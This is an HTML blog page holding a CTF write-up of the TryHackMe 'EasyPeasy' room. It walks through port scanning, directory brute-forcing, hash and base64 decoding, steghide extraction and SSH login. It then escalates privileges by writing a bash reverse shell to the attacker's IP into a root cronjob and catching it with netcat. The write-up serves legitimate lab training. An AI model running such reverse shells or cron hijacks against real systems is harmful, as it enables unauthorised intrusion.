@@ -1,0 +1,913 @@
+<!DOCTYPE html>
+<html lang="en"><!--
+ __  __                __                                     __
+/\ \/\ \              /\ \             __                    /\ \
+\ \ \_\ \   __  __    \_\ \      __   /\_\      __       ___ \ \ \/'\
+ \ \  _  \ /\ \/\ \   /'_` \   /'__`\ \/\ \   /'__`\    /'___\\ \ , <
+  \ \ \ \ \\ \ \_\ \ /\ \L\ \ /\  __/  \ \ \ /\ \L\.\_ /\ \__/ \ \ \\`\
+   \ \_\ \_\\/`____ \\ \___,_\\ \____\ _\ \ \\ \__/.\_\\ \____\ \ \_\ \_\
+    \/_/\/_/ `/___/> \\/__,_ / \/____//\ \_\ \\/__/\/_/ \/____/  \/_/\/_/
+                /\___/                \ \____/
+                \/__/                  \/___/
+
+Powered by Hydejack v9.0.4 <https://hydejack.com/>
+-->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<head>
+  
+
+
+
+
+
+
+  
+    
+
+<title>EasyPeasy on Tryhackme | Zebra Blog</title>
+<meta name="description" content="
+">
+<link rel="canonical" href="http://localhost:4000/writeup/thm">
+
+  
+
+  
+    <meta name="keywords" content="hacking,programming,ctf,writeup,ethical hacking,whitehat,pen-testing">
+  
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta http-equiv="x-ua-compatible" content="ie=edge">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-title" content="Zebra Blog">
+<meta name="apple-mobile-web-app-status-bar-style" content="default">
+
+<meta name="application-name" content="Zebra Blog">
+
+
+  <meta name="theme-color" content="rgb(8,46,57)">
+
+
+<meta name="generator" content="Hydejack v9.0.4" />
+
+
+<link rel="alternate" href="http://localhost:4000/writeup/thm" hreflang="en">
+
+<link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Zebra Blog" />
+
+
+<link rel="shortcut icon"    href="/assets/icons/favicon.ico">
+<link rel="apple-touch-icon" href="/assets/icons/icon-192x192.png">
+
+<link rel="manifest" href="/assets/site.webmanifest">
+
+
+  <link rel="dns-prefetch" href="https://fonts.googleapis.com">
+  <link rel="dns-prefetch" href="https://fonts.gstatic.com">
+
+
+
+
+<link rel="preload" href="/assets/img/swipe.svg" as="image" id="_hrefSwipeSVG">
+
+
+
+
+
+
+<script>!function(e,t){"use strict";function n(e,t,n,o){e.addEventListener?e.addEventListener(t,n,o):e.attachEvent?e.attachEvent("on"+t,n):e["on"+t]=n}e.loadJS=function(e,o){var r=t.createElement("script");r.src=e,o&&n(r,"load",o,{once:!0});var a=t.scripts[0];return a.parentNode.insertBefore(r,a),r},e._loaded=!1,e.loadJSDeferred=function(o,r){function a(){e._loaded=!0,r&&n(c,"load",r,{once:!0});var o=t.scripts[0];o.parentNode.insertBefore(c,o)}var c=t.createElement("script");return c.src=o,e._loaded?a():n(e,"load",a,{once:!0}),c},e.setRel=e.setRelStylesheet=function(e){function o(){this.rel="stylesheet"}n(t.getElementById(e),"load",o,{once:!0})}}(window,document);
+!function(a){"use strict";var b=function(b,c,d){function e(a){return h.body?a():void setTimeout(function(){e(a)})}function f(){i.addEventListener&&i.removeEventListener("load",f),i.media=d||"all"}var g,h=a.document,i=h.createElement("link");if(c)g=c;else{var j=(h.body||h.getElementsByTagName("head")[0]).childNodes;g=j[j.length-1]}var k=h.styleSheets;i.rel="stylesheet",i.href=b,i.media="only x",e(function(){g.parentNode.insertBefore(i,c?g:g.nextSibling)});var l=function(a){for(var b=i.href,c=k.length;c--;)if(k[c].href===b)return a();setTimeout(function(){l(a)})};return i.addEventListener&&i.addEventListener("load",f),i.onloadcssdefined=l,l(f),i};"undefined"!=typeof exports?exports.loadCSS=b:a.loadCSS=b}("undefined"!=typeof global?global:this);
+!function(a){if(a.loadCSS){var b=loadCSS.relpreload={};if(b.support=function(){try{return a.document.createElement("link").relList.supports("preload")}catch(b){return!1}},b.poly=function(){for(var b=a.document.getElementsByTagName("link"),c=0;c<b.length;c++){var d=b[c];"preload"===d.rel&&"style"===d.getAttribute("as")&&(a.loadCSS(d.href,d,d.getAttribute("media")),d.rel=null)}},!b.support()){b.poly();var c=a.setInterval(b.poly,300);a.addEventListener&&a.addEventListener("load",function(){b.poly(),a.clearInterval(c)}),a.attachEvent&&a.attachEvent("onload",function(){a.clearInterval(c)})}}}(this);
+!function(w) {
+  w._baseURL = '/';
+  w._publicPath = '/assets/js/';
+  w._noPushState = false;
+  w._noDrawer = false;
+  w._noNavbar = false;
+  w._noToc = false;
+  w._noSearch = false;
+}(window);
+</script>
+
+
+
+<!--[if gt IE 8]><!---->
+
+  
+
+
+
+
+<link rel="stylesheet" href="/assets/css/hydejack-9.0.4.css" id="_stylePreload">
+<link rel="stylesheet" href="/assets/icomoon/style.css" id="_iconsPreload">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Slab:700%7CNoto+Sans:400,400i,700,700i&display=swap" id="_fontsPreload">
+
+
+
+  <style id="_pageStyle">
+
+html{--accent-color: rgb(79,177,186);--accent-color-faded: rgba(79,177,186,0.5);--accent-color-darkened: #409ba3;--theme-color: rgb(8,46,57)}
+
+</style>
+
+
+<!--<![endif]-->
+
+
+
+
+
+</head>
+
+<body class="dark-mode no-break-layout">
+  
+
+
+<hy-push-state
+  id="_pushState"
+  replace-selector="#_main"
+  link-selector="a[href]:not([href^='/assets/']):not(.external):not(.no-push-state)"
+  script-selector="script"
+  duration="500"
+  hashchange
+>
+  
+  <div id="_navbar" class="navbar fixed-top">
+  <div class="content">
+    <span class="sr-only">Jump to:</span>
+    <div class="nav-btn-bar">
+      <a id="_menu" class="nav-btn no-hover" href="#_drawer--opened">
+        <span class="sr-only">Navigation</span>
+        <span class="icon-menu"></span>
+      </a>
+      <div class="nav-span"></div>
+    </div>
+  </div>
+</div>
+<hr class="sr-only" hidden />
+
+  <main
+  id="_main"
+  class="content layout-post"
+  role="main"
+>
+  
+
+
+
+
+
+<article id="post-writeup-zebratest" class="page post mb6" role="article">
+  <header>
+    <h1 class="post-title flip-project-title">
+      
+        EasyPeasy on Tryhackme
+      
+    </h1>
+
+    <div class="post-date">
+      
+      <time datetime="2020-10-27T09:22:00+01:00">27 Oct 2020</time>
+      
+      
+      
+      
+      
+
+
+
+
+
+
+
+
+
+in <span>Writeup</span> / <span>Thm</span>
+
+      
+
+
+
+
+
+
+
+
+
+
+
+    </div>
+
+    
+    
+
+    
+
+
+
+  <div class="hr pb0"></div>
+
+
+  </header>
+
+  
+    <p><img src="/images/easypeasy.png" alt="alt text" /></p>
+
+<p><strong><a href="https://tryhackme.com/room/easypeasyctf">THM EasyPeasy Link</a></strong></p>
+
+<h1 id="easypeasy-writeup">EasyPeasy WriteUp</h1>
+<h2 id="by-zebra">by Zebra</h2>
+
+<blockquote>
+
+  <p>*Platform	: Tryhackme <br />
+*Difficulty	: Easy<br />
+*OS		  	: Linux</p>
+</blockquote>
+
+<blockquote>
+  <blockquote>
+
+    <p>Challenge Tags:
+#encryption, #hash cracking, #file extraction, #reverse shell,</p>
+  </blockquote>
+</blockquote>
+
+<hr />
+<h3 id="tasks"><ins>Tasks</ins></h3>
+
+<p>Task 1.1: How many ports are open?<br />
+Task 1.2: What is the version of nginx?<br />
+Task 1.3: What is running on the highest port?<br />
+Task 2.1: Using GoBuster, find flag 1.                                                           <br />
+Task 2.2: Further enumerate the machine, what is flag 2?<br />
+Task 2.3: Crack the hash with easypeasy.txt, What is the flag 3?<br />
+Task 2.4: What is the hidden directory?<br />
+Task 2.5: Using the wordlist that provided to you in this task crack the hash
+		  what is the password?                                                  <br />
+Task 2.6: What is the password to login to the machine via SSH?<br />
+Task 2.7: What is the user flag?<br />
+Task 2.8: What is the root flag?</p>
+
+<h2 id="introduction"><ins>Introduction</ins></h2>
+
+<p>Hello and welcome to the Write-Up of the Room “Easy Peasy” on 
+tryhackme.<br />
+First i make some directories for better structure.<br />
+Then I check the Task, which I had to solve.<br />
+We see, that with have a little red line to get the user and root flag.
+Our Steps are:</p>
+<ol>
+  <li>Scanning and Enumeration</li>
+  <li>Exploitation</li>
+  <li>Post Exploitation</li>
+  <li>Priv Escalation</li>
+</ol>
+
+<p><strong>So let’s begin:</strong></p>
+
+<h2 id="preparation-steps"><ins>Preparation Steps</ins></h2>
+
+<blockquote>
+
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>EasyPeasy <span class="c">#New Room folder</span>
+<span class="nb">cd </span>EasyPeasy   	<span class="c">#Move into folder</span>
+<span class="nb">mkdir </span>nmap  	<span class="c">#Nmap directory</span>
+<span class="nb">mkdir </span>gobuster  <span class="c">#Gobuster directory</span>
+</code></pre></div>  </div>
+  <p><strong>Important: Download under Task 2 the “easypeasy.txt”!!!</strong></p>
+</blockquote>
+
+<h2 id="scanning-and-enumeration"><ins>Scanning and Enumeration</ins></h2>
+
+<p>This time i user Rustscan. Rustscan is a bit faster then nmap, cause 
+first it scans the open ports and do a port list and then it initialize the
+specific scans.</p>
+
+<p><ins>Rustscan</ins><br />
+<code class="language-plaintext highlighter-rouge">rustscan 10.10.144.140 -- -A | tee ./nmap/rust_initial.txt</code></p>
+<blockquote>
+
+  <p>PORT      STATE SERVICE REASON  VERSION<br />
+80/tcp    open  http    syn-ack nginx 1.16.1<br />
+| http-methods: <br />
+|_  Supported Methods: GET HEAD<br />
+| http-robots.txt: 1 disallowed entry <br />
+|<em>/<br />
+|_http-server-header: nginx/1.16.1<br />
+|_http-title: Welcome to nginx!<br />
+6498/tcp  open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br />
+65524/tcp open  http    syn-ack Apache httpd 2.4.43 ((Ubuntu))<br />
+| http-methods: <br />
+|</em>  Supported Methods: POST OPTIONS HEAD GET<br />
+| http-robots.txt: 1 disallowed entry <br />
+|_/<br />
+|_http-server-header: Apache/2.4.43 (Ubuntu)<br />
+|_http-title: Apache2 Debian Default Page: It works<br />
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+</blockquote>
+
+<p>We see that we have 3 Ports on the board whit different hints.<br />
+This would be shown cause of <code class="language-plaintext highlighter-rouge">$nmap -sC #Script detection</code> <code class="language-plaintext highlighter-rouge">-sV #Version detection</code> <code class="language-plaintext highlighter-rouge">-O #Os detection</code>
+(for the inclusion of all these switches use $nmap -A)</p>
+<blockquote>
+
+  <p><ins>2 x Webserver:</ins><br />
+80/tcp - Nginx 1.16.1; robots.txt;<br />
+65524/tcp - Apache 2.4.43;</p>
+
+  <p><ins>1x ssh:</ins><br />
+6498/tcp,With Priv Keys;</p>
+</blockquote>
+
+<p>###
+<strong>Task 1.1 -1.3 solved</strong>
+###</p>
+
+<hr />
+
+<h2 id="webserver-enumeration"><ins>Webserver Enumeration</ins></h2>
+
+<p>We found 2 web-servers so we could run our standard procedures
+for webserver enumeration:</p>
+
+<h3 id="server-on-port-80"><ins>#Server on Port 80:</ins></h3>
+
+<p>Check the robots.txt:</p>
+<blockquote>
+  <p>Nothing interesting.</p>
+</blockquote>
+
+<p><ins>So start a Gobuster Scan:</ins><br />
+For this operation i often use the common.txt or the small to medium directory list of standard kali wordlists.</p>
+
+<p><code class="language-plaintext highlighter-rouge">gobuster dir -u http://'machine-ip' -w /usr/share/dirb/wordlists/common.txt</code></p>
+
+<p>→ We find the directory <strong>“/hidden”</strong></p>
+<blockquote>
+
+  <p>So go to <code class="language-plaintext highlighter-rouge">http://ip/hidden</code> and check the Page. Put Ctrl+U for Check the Source-Code of the
+Page. But nothing interesting there.</p>
+</blockquote>
+
+<p>We start another Gobuster scan on <br />
+<code class="language-plaintext highlighter-rouge">gobuster dir -u http://'machine-ip/hidden -w /usr/share/dirb/wordlists/common.txt</code></p>
+
+<p>→ Check! Another directory called <strong>“/whatever”</strong></p>
+<blockquote>
+
+  <p>If you have a look to your taskbar you see the title “dead end”. This could be a hint for
+another gobuster scan on /hidden/whatever.</p>
+</blockquote>
+
+<p>But before we leave, lets check the source code again.</p>
+
+<p>→ Check: <strong>“&lt;p hidden&gt;ZmxhZ3tmMXJzN19mbDRnfQ==&lt;/p&gt;”</strong> would give us an interesting
+string which ends with ==.</p>
+<blockquote>
+
+  <p>“==” is often a base64 string.</p>
+</blockquote>
+
+<p>We could decode this with <code class="language-plaintext highlighter-rouge">echo -e ZmxhZ3tmMXJzN19mbDRnfQ== | base64 -d</code><br />
+(You could check the string on “Cyberchef” too).</p>
+
+<p>###<br />
+<strong>Task 2.1 solved</strong><br />
+###</p>
+
+<hr />
+
+<h2 id="checking-the-pictures"><ins>Checking the pictures:</ins></h2>
+
+<p>Let’s download the two pictures: <br />
+One from /hidden and the another from /hidden/whatever
+to check if there any hidden files in the images.</p>
+
+<p><code class="language-plaintext highlighter-rouge">wget “and the picture links in the source code</code></p>
+
+<p>Check with steghide:</p>
+
+<p><code class="language-plaintext highlighter-rouge">steghide extract -sf image.jpg</code></p>
+<blockquote>
+
+  <p>→ Both need password and we don’t have one. So put this away to don’t lost time.</p>
+</blockquote>
+
+<p>We don’t have any hints so the second webserver will be our target</p>
+
+<hr />
+
+<h2 id="webserver-on-port-65524"><ins>Webserver on port <b>65524</b></ins></h2>
+
+<p>Visit http://ip:65524/robots.txt</p>
+
+<p>We find:</p>
+
+<p>→ User-Agent:a18672860d0510e5ab6699730763b250</p>
+<blockquote>
+
+  <p>This Flag Can Enter But Only This Flag No More Exceptions
+Alway when i find a string i check if it could be a hash.</p>
+</blockquote>
+
+<p><ins>Check for hash:</ins></p>
+
+<p><code class="language-plaintext highlighter-rouge">hash-identifier and check “a18672860d0510e5ab6699730763b250”</code></p>
+
+<center><p><img src="/images/easypeasy_hash1.png" /></p></center>
+
+<blockquote>
+
+  <p>Its an MD5 hash.<br />
+Crack it. I try it with hashcat but i get nothing. Some googling around i solved it with
+MD5hashing and get flag.</p>
+</blockquote>
+
+<p>###<br />
+<strong>Task 2.2 solved</strong><br />
+###</p>
+
+<hr />
+
+<p>The following step after robots.txt is, checking the actual page and the source code.  <br />
+If we look through the code and search for words like “username”,”user”, “password”, “pass”
+and “flag”.</p>
+
+<p>→ We find the flag for Task 2.3</p>
+
+<p>###  <br />
+<strong>Task 2.3 solved</strong><br />
+###</p>
+
+<hr />
+
+<p>When we think about our first website Scanning we recognized that a hidden file was
+placed between a string called <code class="language-plaintext highlighter-rouge">&lt;p hidden&gt;</code> so we will search for this to.</p>
+
+<p>→ And check! <code class="language-plaintext highlighter-rouge">&lt;p hidden&gt;its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu&lt;/p&gt;</code>.  <br />
+   We find “ba….:ObsJmP173N2X6dOrAgEAL0Vu”.</p>
+
+<blockquote>
+
+  <p>And what we will do, when we find a string?!   <br />
+Check for decryption. We se “bas….:” so it could be a “base..” format.</p>
+</blockquote>
+
+<p>Check on Cyberchef.</p>
+<blockquote>
+
+  <p>Put in the string “ObsJmP173N2X6dOrAgEAL0Vu” and try all “from base..”.
+You get a hit and find the hidden directory.</p>
+</blockquote>
+
+<center><p><img src="/images/easypeasy_cyber1.png" /></p></center>
+
+<p>###  <br />
+<strong>Task 2.4 solved</strong><br />
+###</p>
+
+<hr />
+
+<p>Visit <code class="language-plaintext highlighter-rouge">http://ip:65542/n0**********</code> and check source code.</p>
+
+<p>→ We see that there are two .jpg files. One with no link out of the internet and the name
+“binarycodepixabay.jpg”. <strong>Download this with <code class="language-plaintext highlighter-rouge">wget</code></strong>.</p>
+
+<p>But another interesting thing there. Another long <strong>string</strong> under the jpg.</p>
+
+<blockquote>
+
+  <p>Same procedure with every string -&gt; identify</p>
+</blockquote>
+
+<p><code class="language-plaintext highlighter-rouge">hash-identifier : SHA-256</code></p>
+
+<blockquote>
+
+  <p>Crack with MD5hashing; with hashcat no fast chance.</p>
+</blockquote>
+
+<p>###  <br />
+<strong>Task 2.5 solved</strong><br />
+###</p>
+
+<hr />
+
+<p><ins>Extract with steghide</ins></p>
+
+<p><code class="language-plaintext highlighter-rouge">steghide extract -sf image.jpg</code></p>
+
+<p>Use the password we find in Task 2.5.</p>
+<blockquote>
+
+  <p>Why this? Cause the string was on the same page and under the jpp image.</p>
+</blockquote>
+
+<p>→ We get a secrettext.txt file with content.</p>
+
+<p><code class="language-plaintext highlighter-rouge">Username: Boring</code><br />
+<code class="language-plaintext highlighter-rouge">Password: Binary code</code></p>
+<blockquote>
+
+  <p>Crack Binary to ascii.</p>
+</blockquote>
+
+<p>Use Cyberchef or use <br />
+<code class="language-plaintext highlighter-rouge">echo -e binary code without spaces” | perl -lpe '$_=pack"B*",$_'</code></p>
+
+<p>###  <br />
+<strong>Task 2.6 solved</strong><br />
+###</p>
+
+<hr />
+
+<p>In Task 2.6 we had <strong>credentials for ssh</strong>:</p>
+<blockquote>
+
+  <p>shh with specific Port (find with rustscan)</p>
+</blockquote>
+
+<p><code class="language-plaintext highlighter-rouge">ssh boring@IP -p 6498</code></p>
+
+<blockquote>
+
+  <p>Grep the userfile with $ls and $cat user.txt</p>
+</blockquote>
+
+<p>###  <br />
+<strong>Task 2.6 solved</strong><br />
+###</p>
+
+<hr />
+
+<h2 id="priv-escalation-enumeration"><ins>Priv Escalation Enumeration</ins></h2>
+
+<p><code class="language-plaintext highlighter-rouge">sudo -l</code></p>
+<blockquote>
+  <p>nothing</p>
+</blockquote>
+
+<p><code class="language-plaintext highlighter-rouge">$find / -perm -u=s -type f 2&gt;/dev/null</code></p>
+<blockquote>
+  <p>nothing</p>
+</blockquote>
+
+<p><code class="language-plaintext highlighter-rouge">cat /etc/crontab</code></p>
+
+<p>→ Check: .mysecretcronjob.sh</p>
+
+<p><ins>Privesc with cronjob:</ins></p>
+
+<p>We find the cronjob with /var/www/.mysecretcronjob.sh.<br />
+Place a <strong>reverse shell</strong> with nano.</p>
+
+<p><code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/'my-own-ip'/4444 0&gt;&amp;1</code></p>
+
+<p><ins>Start listener and wait</ins></p>
+
+<p><code class="language-plaintext highlighter-rouge">nc -lnvp 4444</code></p>
+
+<blockquote>
+
+  <p>(You can check if the .sh works with ./.mysecretcronjob.sh.<br />
+But it will be only a normal shell cause boring executed it)</p>
+</blockquote>
+
+<p>→ Check: ROOT Shell</p>
+
+<p><code class="language-plaintext highlighter-rouge">cat /root/root.txt</code>
+Last Task 2.8 with root.txt</p>
+
+<p>###  <br />
+<strong>Task 2.7 solved</strong><br />
+###</p>
+
+<blockquote>
+
+  <p>Summery: For the most of the hash cracking operations at tryhackme or hackthebox
+I use the cracking pages at the internet. Because other users can crack the password
+before and you saved a lot of time and resources. In any machines you cannot solve
+the cracking operation with a specific password list or brute force over a long time.</p>
+</blockquote>
+
+<p>So here are some links for cracking sites:</p>
+
+<p><a href="https://crackstation.net/">Crackstation</a><br />
+<a href="https://www.tunnelsup.com/hash-analyzer/">Hash-analyzer</a><br />
+<a href="https://gchq.github.io/CyberChef/">Cyberchef</a><br />
+<a href="https://md5hashing.net/">MD5 hasching</a></p>
+
+<hr />
+
+
+  
+</article>
+
+
+<hr class="dingbat related" />
+
+
+
+
+  
+     
+
+
+
+  
+
+  
+  
+
+  
+    
+
+
+  
+
+  
+  
+
+  
+    
+
+  
+
+
+  
+<footer class="content" role="contentinfo">
+  <hr/>
+  
+    <p><small class="copyright">© 2020. Zebra. All rights reserved.
+</small></p>
+  
+  
+    <nav class="legal"><small>
+    
+      
+      <a class="heading flip-title" href="https://github.com/Zebra777">Github</a>
+      |
+    
+      
+      <a class="heading flip-title" href="https://discord.gg/4V8xu2">Discord</a>
+      |
+    
+      
+      <a class="heading flip-title" href="https://tryhackme.com/p/zebra">Tryhackme</a>
+      
+    
+    </small></nav>
+  
+    <p><small>Powered by <a class="external" href="https://hydejack.com/">Hydejack</a> v<span id="_version">9.0.4</span></small></p>
+  <hr class="sr-only"/>
+</footer>
+
+
+</main>
+
+  <hy-drawer
+  id="_drawer"
+  class=""
+  side="left"
+  threshold="10"
+  noscroll
+  
+>
+  <header id="_sidebar" class="sidebar" role="banner">
+    
+
+
+
+
+<div class="sidebar-bg sidebar-overlay" style="background-color:rgb(8,46,57);background-image:url(/assets/img/sidebar-bg.jpg)"></div>
+
+    <div class="sidebar-sticky">
+  <div class="sidebar-about">
+    
+      <a class="no-hover" href="/" tabindex="-1">
+        <img src="/assets/img/logo.png" class="avatar" alt="Zebra Blog" width="120" height="120" loading="lazy" />
+      </a>
+    
+    <a class="sidebar-title" href="/"><h2 class="h1">Zebra Blog</h2></a>
+    
+    
+      <p class="">
+        ‘This is a Blog about #CTFs, #WriteUps, #Pen-Testing and #Programming.’
+
+      </p>
+    
+  </div>
+
+  <nav class="sidebar-nav heading" role="navigation">
+    <span class="sr-only">Navigation:</span>
+<ul>
+  
+    
+      
+      <li>
+        <a
+          id="_drawer--opened"
+          href="/writeup/"
+          class="sidebar-nav-item"
+          
+        >
+          Write Up
+        </a>
+      </li>
+    
+      
+      <li>
+        <a
+          
+          href="/tools/"
+          class="sidebar-nav-item"
+          
+        >
+          Resources
+        </a>
+      </li>
+    
+      
+      <li>
+        <a
+          
+          href="/cheatsheet/"
+          class="sidebar-nav-item"
+          
+        >
+          Cheat Sheet
+        </a>
+      </li>
+    
+      
+      <li>
+        <a
+          
+          href="/archive/"
+          class="sidebar-nav-item"
+          
+        >
+          Archive
+        </a>
+      </li>
+    
+      
+      <li>
+        <a
+          
+          href="/blogs/"
+          class="sidebar-nav-item"
+          
+        >
+          Following Blogs
+        </a>
+      </li>
+    
+      
+      <li>
+        <a
+          
+          href="/about/"
+          class="sidebar-nav-item"
+          
+        >
+          About
+        </a>
+      </li>
+    
+  
+</ul>
+
+  </nav>
+
+  
+  <div class="sidebar-social">
+    <span class="sr-only">Social</span>
+<ul>
+  
+    
+      
+
+
+
+  
+
+  
+  
+  
+  
+
+  
+
+  
+
+  <li>
+    <a href="https://github.com/zebra777" title="GitHub" class="no-mark-external">
+      <span class="icon-github"></span>
+      <span class="sr-only">GitHub</span>
+    </a>
+  </li>
+
+
+    
+  
+</ul>
+
+  </div>
+</div>
+  </header>
+</hy-drawer>
+<hr class="sr-only" hidden />
+
+</hy-push-state>
+
+
+  <!--[if gt IE 10]><!---->
+  <script nomodule>!function(){var e=document.createElement("script");if(!("noModule"in e)&&"onbeforeload"in e){var t=!1;document.addEventListener("beforeload",function(n){if(n.target===e)t=!0;else if(!n.target.hasAttribute("nomodule")||!t)return;n.preventDefault()},!0),e.type="module",e.src=".",document.head.appendChild(e),e.remove()}}();
+</script>
+  <script src="/assets/js/hydejack-9.0.4.js" type="module"></script>
+  <script src="/assets/js/LEGACY-hydejack-9.0.4.js" nomodule defer></script>
+  
+
+  
+
+<!--<![endif]-->
+  
+
+
+
+<div hidden>
+  
+  <h2 class="sr-only">Templates:</h2>
+
+  <template id="_animation-template">
+  <div class="animation-main fixed-top">
+    <div class="content">
+      <div class="page"></div>
+    </div>
+  </div>
+</template>
+
+  <template id="_loading-template">
+  <div class="loading nav-btn fr">
+    <span class="sr-only">Loading…</span>
+    <span class="icon-cog"></span>
+  </div>
+</template>
+
+  <template id="_error-template">
+  <div class="page">
+    <h1 class="page-title">Error</h1>
+    
+    
+    <p class="lead">
+      Sorry, an error occurred while loading: <a class="this-link" href=""></a>.
+    </p>
+  </div>
+</template>
+
+  <template id="_forward-template">
+  <button id="_forward" class="forward nav-btn no-hover">
+    <span class="sr-only">Forward</span>
+    <span class="icon-arrow-right2"></span>
+  </button>
+</template>
+
+  <template id="_back-template">
+  <button id="_back" class="back nav-btn no-hover">
+    <span class="sr-only">Back</span>
+    <span class="icon-arrow-left2"></span>
+  </button>
+</template>
+
+  <template id="_permalink-template">
+  <a href="#" class="permalink">
+    <span class="sr-only">Permalink</span>
+    <span class="content-hash"></span>
+  </a>
+</template>
+
+</div>
+
+
+</body>
+</html>
